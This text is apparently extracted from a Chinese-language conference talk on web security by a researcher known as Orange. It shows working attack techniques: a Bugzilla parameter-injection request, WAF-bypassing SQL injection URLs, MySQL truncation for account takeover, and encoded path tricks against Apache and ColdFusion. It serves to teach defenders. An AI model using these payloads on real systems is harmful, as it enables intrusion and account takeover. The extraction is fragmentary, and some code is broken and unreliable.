• 蔡政达 a.k.a Orange 
• CHROOT 成员 / HITCON 成员 / DEVCORE 资安顾问 
• 国内外研讨会 HITCON, AVTokyo, WooYun 等讲师 
• 国内外骇客竞赛 Capture the Flag 冠军 
• 揭露过 Microsoft, Django, Yahoo, Facebook, Google 等弱
点漏洞 
• 专精于骇客⼿手法、Web Security 与网路渗透 
#90后 #赛棍 #电竞选⼿手 #渗透师 #Web狗 #🐶
– 讲 Web 可以讲到你们听不懂就赢了
– “⿊黑了你，从不是在你知道的那个点上”
– 摆在你眼前是 Feature、摆在骇客眼前就是漏洞
- 别⼈人笑我太疯癫，我笑他⼈人看不穿
- 猥琐“流”
Q: 资料库中的密码破不出来怎么办？
第三⽅方内
容安全
前端 
安全
DNS 
安全
Web应⽤用 
安全
Web框架 
安全
后端语⾔言 
安全
Web伺服
器安全
资料库 
安全
作业系统 
安全
XSS
XXE
SQL Injection
CSRF
第三⽅方内
容安全
前端 
安全
DNS 
安全
Web应⽤用 
安全
Web框架 
安全
后端语⾔言 
安全
Web伺服
器安全
资料库 
安全
作业系统 
安全
Struts2 OGNL RCE
Rails YAML RCE
PHP Memory UAF
XSS
UXSS
Padding Oracle
Padding Oracle
XXE
DNS Hijacking
SQL Injection
Length Extension Attack
ShellShock
HeartBleed
JSONP Hijacking
FastCGI RCE
NPRE RCE
OVERLAYFS Local Root
CSRF
Bit-Flipping Attack
第三⽅方内
容安全
前端 
安全
DNS 
安全
Web应⽤用 
安全
Web框架 
安全
后端语⾔言 
安全
Web伺服
器安全
资料库 
安全
作业系统 
安全 
🌰
- Perl 语⾔言特性导致网⾴页应⽤用程式漏洞
🌰
@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => @list };
print Dumper($hash); # ?
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => 'Ba', 
          'Ba' => 'Banana' };
@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => @list };
print Dumper($hash); # wrong!
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => ('Ba', 'Ba', 'Banana') };
@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => @list };
print Dumper($hash); # correct!
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => 'Ba', 
          'Ba' => 'Banana' };
my $otheruser = Bugzilla::User->create(
{
    login_name => $login_name,
    realname   => $cgi->param('realname'),
    cryptpassword => $password
});
my $otheruser = Bugzilla::User->create(
{
    login_name => $login_name,
    realname   => $cgi->param('realname'),
    cryptpassword => $password
});
# index.cgi?
realname=xxx&realname=login_name&realname=
admin
- Windows 特性造成网⾴页应⽤用限制绕过
🌰
• Windows API 档名正规化特性
- shell.php # shel>.php # shell"php # shell. System Dir -> Plugin Dir 
• 简单说就是利⽤用 into outfile 建⽴立⺫⽬目录
- INTO OUTFILE 'plugins::$index_allocation' 
- mkdir plugins
– 对系统特性的不了解会导致“症状解”
– 讲三个较为有趣并被⼈人忽略的特性与技巧
• 问题点
- 未正确的使⽤用正规表⽰示式导致⿊黑名单被绕过 
• 范例
- WAF 绕过 
- 防御绕过
- 中⽂文换⾏行编码绕过网⾴页应⽤用防⽕火墙规则
http://hackme.cc/view.aspx 
?sem=' UNION SELECT(user),null,null,null, 
&noc=,null,null,null,null,null/*三*/FROM 
dual--
http://hackme.cc/view.aspx 
?sem=' UNION SELECT(user),null,null,null, 
&noc=,null,null,null,null,null/*上*/FROM 
dual--
http://hackme.cc/view.aspx 
?sem=' UNION SELECT(user),null,null,null, 
&noc=,null,null,null,null,null/*上*/FROM 
dual--
%u4E0A 
%u4D0A 
...
- 绕过防御限制继续 Exploit
for($i=0; $iPHP 5.3.9)
• 问题点
- 对资料不了解，设置了错误的语系、资料型态 
• 范例
- ⼆二次 SQL 注⼊入 
- 字符截断导致 ...
- 输⼊入内容⼤大于指定形态⼤大⼩小之截断
$name = $_POST['name'];
$r = query('SELECT * FROM users WHERE name=?', $name);
if (count($r) > 0){
  die('duplicated name');
} else {
  query('INSERT INTO users VALUES(?, ?)', $name, $pass);
  die('registed');
}
// CREATE TABLE users(id INT, name VARCHAR(255), ...)
mysql> CREATE TABLE users ( 
    -> id INT,  
    -> name VARCHAR(255),  
    -> pass VARCHAR(255) 
    -> ); 
Query OK, 0 rows affected (0.00 sec) 
mysql> INSERT INTO users VALUES(1, 'admin', 'pass'); 
Query OK, 1 row affected (0.00 sec) 
mysql> INSERT INTO users VALUES(2, 'admin   ...   x', 'xxd'); 
Query OK, 1 row affected, 1 warning (0.00 sec) 
mysql> SELECT * FROM users WHERE name='admin'; 
+------+------------------+------+ 
| id   | name             | pass | 
+------+------------------+------+ 
|    1 | admin            | pass | 
|    2 | admin            | xxd  | 
+------+------------------+------+ 
2 rows in set (0.00 sec)
name: admin   ...   x
[space] x 250
CVE-2009-2762 WordPress 2.6.1 Column Truncation Vulnerability
- CREATE TABLE users (id INT, name TEXT, ...)
CVE-2015-3440 WordPress 4.2.1 Truncation Vulnerability
- Unicode 编码之截断 🍊
$name = $_POST['name'];
if (strlen($name) > 16)
  die('name too long');
$r = query('SELECT * FROM users WHERE name=?', $name);
if (count($r) > 0){
  die('duplicated name');
} else {
  query('INSERT INTO users VALUES(?, ?)', $name, $pass);
  die('registed');
}
// CREATE TABLE users(id INT, name VARCHAR(255), ...) 
DEFAULT CHARSET=utf8
mysql> CREATE TABLE users ( 
    -> id INT,  
    -> name VARCHAR(255),  
    -> pass VARCHAR(255) 
    -> ) DEFAULT CHARSET=utf8; 
Query OK, 0 rows affected (0.00 sec) 
mysql> INSERT INTO users VALUES(1, 'admin', 'pass'); 
Query OK, 1 row affected (0.01 sec) 
mysql> INSERT INTO users VALUES(2, 'admin🍊x', 'xxd'); 
Query OK, 1 row affected, 1 warning (0.00 sec) 
mysql> SELECT * FROM users WHERE name='admin'; 
+------+-------+------+ 
| id   | name  | pass | 
+------+-------+------+ 
|    1 | admin | pass | 
|    2 | admin | xxd  | 
+------+-------+------+ 
2 rows in set (0.00 sec)
name: admin🍊x
🍊🐱🐶🐝💩
CVE-2013-4338 WordPress , return 403
Apache
http://hackme.cc/admin%252f.htaccess
/admin%2f.htaccess not found, return 404
http://hackme.cc/admin%2f.htaccess
Apache
http://hackme.cc/admin%252f.htaccess%2500.cfm
End with .cfm, pass to ColdFusion
http://hackme.cc/admin%2f.htaccess%00.cfm
ColdFusion
http://hackme.cc/admin/.htaccess .cfm
http://hackme.cc/admin%2f.htaccess%00.cfm